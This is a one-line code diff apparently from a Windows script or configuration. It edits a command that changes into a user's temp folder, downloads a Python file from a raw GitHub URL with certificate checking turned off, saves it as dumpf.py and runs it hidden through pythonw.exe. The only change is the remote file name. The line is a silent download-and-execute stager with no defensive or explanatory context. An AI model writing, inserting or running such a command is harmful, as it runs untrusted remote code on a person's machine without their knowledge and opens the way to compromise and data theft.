@@ -1,1 +1,1 @@
-cd "C:/Users/dandaram/_tmp_/python/"&curl https://raw.githubusercontent.com/somehat/files/main/xx.py --insecure -o dumpf.py&pythonw.exe dumpf.py
+cd "C:/Users/dandaram/_tmp_/python/"&curl https://raw.githubusercontent.com/somehat/files/main/x.py --insecure -o dumpf.py&pythonw.exe dumpf.py
